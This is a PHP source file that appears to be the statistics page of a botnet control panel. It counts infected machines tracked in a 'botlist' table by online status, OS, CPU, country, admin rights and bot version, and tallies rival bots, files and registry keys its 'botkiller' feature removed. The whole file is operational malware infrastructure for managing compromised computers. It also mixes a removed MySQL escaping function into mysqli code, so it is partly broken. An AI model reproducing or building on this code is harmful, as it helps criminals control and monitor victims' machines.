<?php

	$STATS_TOTAL = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE 1;'));
	
	if($STATS_TOTAL > 0)
	{	
		$row = mysqli_fetch_array(mysqli_query($conn, 'SELECT * FROM peaks WHERE 1 LIMIT 1;'));
		$PEAK_ALLTIME = htmlentities($row['alltime']);
		$PEAK_SEVENDAYS = htmlentities($row['sevendays']);
		$PEAK_TWENTYFOURHOURS = htmlentities($row['twentyfourhours']);
	
		$STATS_ALIVE = array();
		$STATS_ALIVE[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE lastseen >= \'' . mysql_real_escape_string($TIME - DEAD - 30) . '\';'));
		$STATS_ALIVE[] = round($STATS_ALIVE[0] / $STATS_TOTAL * 100, 2);
	
		$STATS_DEAD = array();
		$STATS_DEAD[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE lastseen < \'' . mysql_real_escape_string($TIME - DEAD - 30) . '\';'));
		$STATS_DEAD[] = round($STATS_DEAD[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_ONLINE = array();
		$STATS_ONLINE[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE lastseen >= \'' . mysql_real_escape_string($TIME - ONLINE - 30) . '\';'));
		$STATS_ONLINE[] = round($STATS_ONLINE[0] / $STATS_TOTAL * 100, 2);
	
		$STATS_OFFLINE = array();
		$STATS_OFFLINE[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE lastseen < \'' . mysql_real_escape_string($TIME - ONLINE - 30) . '\' AND lastseen >= \'' . mysql_real_escape_string($TIME - DEAD - 30) . '\';'));
		$STATS_OFFLINE[] = round($STATS_OFFLINE[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_NEW = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE newbot = \'1\' AND lastseen >= \'' . mysql_real_escape_string($TIME - ONLINE - 30) . '\';'));
		
		/*if($STATS_ONLINE[0] > $PEAK_ALLTIME)
		{
			mysqli_query($conn, 'UPDATE peaks SET `alltime` = \'' . $STATS_ONLINE[0] . '\' WHERE 1;');
		}
		
		if($STATS_ONLINE[0] > $PEAK_SEVENDAYS)
		{
			mysqli_query($conn, 'UPDATE peaks SET `sevendays` = \'' . $STATS_ONLINE[0] . '\' WHERE 1;');
		}
		
		if($STATS_ONLINE[0] > $PEAK_TWENTYFOURHOURS)
		{
			mysqli_query($conn, 'UPDATE peaks SET `twentyfourhours` = \'' . $STATS_ONLINE[0] . '\' WHERE 1;');
		}*/
		
		$STATS_32BIT = array();
		$STATS_32BIT[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE cpu=1;'));
		$STATS_32BIT[] = round($STATS_32BIT[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_64BIT = array();
		$STATS_64BIT[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE cpu=0;'));
		$STATS_64BIT[] = round($STATS_64BIT[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_NET = array();
		$STATS_NET[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE net!=\'N/A\';'));
		$STATS_NET[] = round($STATS_NET[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_NONET = array();
		$STATS_NONET[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE net=\'N/A\';'));
		$STATS_NONET[] = round($STATS_NONET[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_OS = mysqli_query($conn, 'SELECT os,count(id) AS \'amount\' FROM botlist WHERE 1 GROUP BY os;');
		$STATS_OPSYS = '';
		while($row = mysqli_fetch_array($STATS_OS)) 
			$STATS_OPSYS .= '						<p><span>' . htmlentities($row['os']) . '</span>' . $row['amount'] . ' (' . round($row['amount'] / $STATS_TOTAL * 100, 2) . '%)</p>' . "\n";

		$STATS_DESKTOP = array();
		$STATS_DESKTOP[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE type=1;'));
		$STATS_DESKTOP[] = round($STATS_DESKTOP[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_LAPTOP = array();
		$STATS_LAPTOP[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE type=0;'));
		$STATS_LAPTOP[] = round($STATS_LAPTOP[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_ADMIN = array();
		$STATS_ADMIN[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE admin=1;'));
		$STATS_ADMIN[] = round($STATS_ADMIN[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_USER = array();
		$STATS_USER[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE admin=0;'));
		$STATS_USER[] = round($STATS_USER[0] / $STATS_TOTAL * 100, 2);
		
		$STATS_BUSY = array();
		$STATS_BUSY[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE busy=1 AND lastseen >= \'' . mysql_real_escape_string($TIME - ONLINE - 30) . '\';'));
		$STATS_BUSY[] = round($STATS_BUSY[0] / $STATS_ONLINE[0] * 100, 2);
		
		$STATS_FREE = array();
		$STATS_FREE[] = mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE busy=0 AND lastseen >= \'' . mysql_real_escape_string($TIME - ONLINE - 30) . '\';'));
		$STATS_FREE[] = round($STATS_FREE[0] / $STATS_ONLINE[0] * 100, 2);
		
		$STATS_BOTKILLER = mysqli_query($conn, 'SELECT SUM(botskilled), SUM(files), SUM(regkey) FROM botlist WHERE 1;');
		$STATS_BOTKILLER = mysqli_fetch_array($STATS_BOTKILLER);
		
		$STATS_PROC = $STATS_BOTKILLER[0];
		$STATS_FILE = $STATS_BOTKILLER[1];
		$STATS_REG = $STATS_BOTKILLER[2];
		
		$STATS_COUNTRY_REQ = mysqli_query($conn, 'SELECT country, count(id) AS \'amount\' FROM botlist WHERE 1 GROUP BY country;');
		$STATS_COUNTRY = '';
		while($row = mysqli_fetch_array($STATS_COUNTRY_REQ)) 
			$STATS_COUNTRY .= '						<p><span>' . htmlentities($row['country']) . '</span>' . $row['amount'] . ' (' . round($row['amount'] / $STATS_TOTAL * 100, 2) . '%)</p>' . "\n";
		
		$STATS_VERSION_REQ = mysqli_query($conn, 'SELECT version, count(id) AS \'amount\' FROM botlist WHERE 1 GROUP BY version;');
		$STATS_VERSION = '';
		while($row = mysqli_fetch_array($STATS_VERSION_REQ)) 
			$STATS_VERSION .= '						<p><span>' . htmlentities($row['version']) . '</span>' . $row['amount'] . ' (' . round($row['amount'] / $STATS_TOTAL * 100, 2) . '%)</p>' . "\n";
		
	}
	
?>